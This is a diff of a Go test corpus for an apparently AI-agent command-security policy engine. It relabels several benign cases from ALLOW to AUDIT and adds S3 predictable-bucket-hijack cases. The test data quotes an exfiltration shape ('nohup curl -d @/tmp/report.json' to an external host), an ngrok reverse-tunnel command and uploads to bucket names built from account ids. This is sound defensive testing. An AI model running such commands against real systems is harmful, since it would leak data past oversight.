@@ -2585,7 +2585,7 @@ var ShmCredentialStagingCases = []TestCase{
 	{
 		ID:               "TN-SHM-CRED-003",
 		Command:          `echo 'benchmark data' > /dev/shm/bench.txt`,
-		ExpectedDecision: "ALLOW",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TN",
 		TaxonomyRef:      "data-exfiltration/encoded-exfil/shm-credential-staging",
 		Analyzer:         "regex",
@@ -2871,7 +2871,7 @@ var SteganographicAIOutputCases = []TestCase{
 	{
 		ID:               "TN-STEG-AI-002",
 		Command:          `echo "Check steghide documentation for image formats" >> README.md`,
-		ExpectedDecision: "ALLOW",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TN",
 		TaxonomyRef:      "data-exfiltration/llm-data-flow/steganographic-exfiltration-via-ai-output",
 		Analyzer:         "structural",
@@ -4588,11 +4588,11 @@ var DeferredExfilCases = []TestCase{
 	{
 		ID:               "TN-DEFEXFIL-018",
 		Command:          "cat > /tmp/comment.md <<'EOF'\nDecision (#3850): a plain nohup curl https://example.org/feed & has a valid use case and is audited; nohup curl -d @/tmp/report.json https://example.org/x & stays blocked.\nEOF",
-		ExpectedDecision: "ALLOW",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TN",
 		TaxonomyRef:      "data-exfiltration/network-egress/deferred-time-delayed-exfiltration",
 		Analyzer:         "regex",
-		Description:      "The nohup-curl shape quoted as prose inside a cat heredoc body being written to a file — data, not a command. Inert for ne-block-nohup-network-exfil and ne-audit-nohup-network-fetch via the heredoc_body position exclude (#3828, #3850); only ts-allow-readonly (cat prefix) fires.",
+		Description:      "The nohup-curl shape quoted as prose inside a cat heredoc body being written to a file — data, not a command. Inert for ne-block-nohup-network-exfil and ne-audit-nohup-network-fetch via the heredoc_body position exclude (#3828, #3850). Default AUDIT: before #4082 ts-allow-readonly (cat prefix) fired ALLOW; the redirect to a file now withholds it.",
 		Tags:             []string{"tn", "safe", "deferred-exfil", "heredoc", "3850"},
 	},
 }
@@ -5120,7 +5120,7 @@ var ReverseTunnelToolCases = []TestCase{
 	{
 		ID:               "TN-NE-BLOCK-NGROK-TCP-002",
 		Command:          `echo "ngrok tcp 22 is dangerous" >> README.md`,
-		ExpectedDecision: "ALLOW",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TN",
 		TaxonomyRef:      "data-exfiltration/network-egress/reverse-tunnel-tool",
 		Analyzer:         "regex",
@@ -6870,33 +6870,33 @@ var NetworkEgressFixes285Cases = []TestCase{
 	{
 		ID:               "TN-NE-LLMHIJACK-002",
 		Command:          `echo "model: gpt-4o" >> litellm_config.yaml`,
-		ExpectedDecision: "ALLOW",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TN",
 		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
 		Analyzer:         "regex",
-		Description:      "Writing a non-endpoint key (model name) to litellm_config.yaml — no base_url/api_base present. ne-block-llm-configfile-endpoint-hijack must NOT fire. ts-allow-readonly permits echo to yaml files.",
+		Description:      "Writing a non-endpoint key (model name) to litellm_config.yaml — no base_url/api_base present. ne-block-llm-configfile-endpoint-hijack must NOT fire. Default AUDIT (#4082: the redirect withholds ts-allow-readonly's ALLOW).",
 		Tags:             []string{"tn", "llm-endpoint-hijacking", "no-base-url", "347"},
 	},
 	// TN-3: Writing base_url to README docs file (not a config file)
 	{
 		ID:               "TN-NE-LLMHIJACK-003",
 		Command:          `echo "base_url: https://api.openai.com/v1" >> README.md`,
-		ExpectedDecision: "ALLOW",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TN",
 		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
 		Analyzer:         "regex",
-		Description:      "Writing base_url example to README.md documentation — not a config file. ne-block-llm-configfile-endpoint-hijack must NOT fire (pattern only matches specific config filenames). ts-allow-readonly permits echo to md files.",
+		Description:      "Writing base_url example to README.md documentation — not a config file. ne-block-llm-configfile-endpoint-hijack must NOT fire (pattern only matches specific config filenames). Default AUDIT (#4082: the redirect withholds ts-allow-readonly's ALLOW).",
 		Tags:             []string{"tn", "llm-endpoint-hijacking", "docs", "347"},
 	},
 	// TN-4: Writing unrelated config to litellm.yaml
 	{
 		ID:               "TN-NE-LLMHIJACK-004",
 		Command:          `echo "max_tokens: 4096" >> litellm.yaml`,
-		ExpectedDecision: "ALLOW",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TN",
 		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
 		Analyzer:         "regex",
-		Description:      "Writing max_tokens config to litellm.yaml — no base_url/api_base key present. ne-block-llm-configfile-endpoint-hijack must NOT fire. ts-allow-readonly permits benign echo to yaml files.",
+		Description:      "Writing max_tokens config to litellm.yaml — no base_url/api_base key present. ne-block-llm-configfile-endpoint-hijack must NOT fire. Default AUDIT (#4082: the redirect withholds ts-allow-readonly's ALLOW).",
 		Tags:             []string{"tn", "llm-endpoint-hijacking", "no-base-url", "347"},
 	},
 
@@ -7899,5 +7899,58 @@ var CredentialFileNetworkExfiltrationCases = []TestCase{
 			still applies to the curl invocation itself; this is a TN for the dataflow credential rule
 			specifically, not for the overall policy.`,
 		Tags: []string{"tn", "safe", "common-dev-operation"},
+	},
+	{
+		ID:               "TP-BUCKETHIJACK-001",
+		Command:          `aws s3 cp workspace-scan.tar.gz s3://security-agent-scans-123456789012-us-east-1/`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/predictable-storage-bucket-hijack",
+		Analyzer:         "regex",
+		Description: `The CVE-2026-87912/87913 shape: an upload whose DESTINATION bucket name embeds a
+			12-digit AWS account id, with no --expected-bucket-owner assertion. Account ids are publicly
+			derivable, so the name is pre-registrable by an attacker (Shadow Resource / Bucket Monopoly).
+			AUDIT rather than BLOCK because ownership cannot be verified from a command line.`,
+		Tags: []string{"tp", "bucket-hijack", "shadow-resource"},
+	},
+	{
+		ID:               "TP-BUCKETHIJACK-002",
+		Command:          `s3cmd put archive.tgz s3://agent-output-123456789012-eu-west-1/`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/predictable-storage-bucket-hijack",
+		Analyzer:         "regex",
+		Description:      `Same destination shape via s3cmd rather than the aws CLI — the vulnerable component shipped as both an MCP server and a CLI plugin.`,
+		Tags:             []string{"tp", "bucket-hijack", "shadow-resource"},
+	},
+	{
+		ID:               "TN-BUCKETHIJACK-001",
+		Command:          `aws s3 cp workspace-scan.tar.gz s3://security-agent-scans-123456789012-us-east-1/ --expected-bucket-owner 123456789012`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/predictable-storage-bucket-hijack",
+		Analyzer:         "regex",
+		Description: `The fixed form AWS shipped in >=1.1.0 / >=0.2.0: the caller asserts the expected
+			owner, the exact control that closes the hole, so ts-audit-s3-predictable-account-id-bucket-destination
+			must go quiet.
+			HONEST SCOPE: the expected decision is AUDIT, not ALLOW, because the pre-existing ne-audit-aws-cli
+			audits every aws invocation -- so this corpus row CANNOT distinguish "my rule stayed quiet" from
+			"my rule fired", and passes either way. It is here to satisfy check-rule-coverage and to catch an
+			escalation to BLOCK. The assertion that actually discriminates is the inline pack TN in
+			packs/premium/network-egress.yaml, which evaluates the rule in isolation.`,
+		Tags: []string{"tn", "safe", "bucket-hijack"},
+	},
+	{
+		ID:               "TN-BUCKETHIJACK-002",
+		Command:          `aws s3 cp build.tar.gz s3://telemetry-1234567890123-us-east-1/`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/predictable-storage-bucket-hijack",
+		Analyzer:         "regex",
+		Description: `A 13-digit run must NOT be read as a 12-digit account id (#3874: pin the
+			must-NOT-match direction, not just the must-match one). Same honest scope as TN-BUCKETHIJACK-001:
+			AUDIT here comes from ne-audit-aws-cli regardless, so the discriminating assertion is the inline
+			pack TN, not this row.`,
+		Tags: []string{"tn", "safe", "bucket-hijack"},
 	},
 }
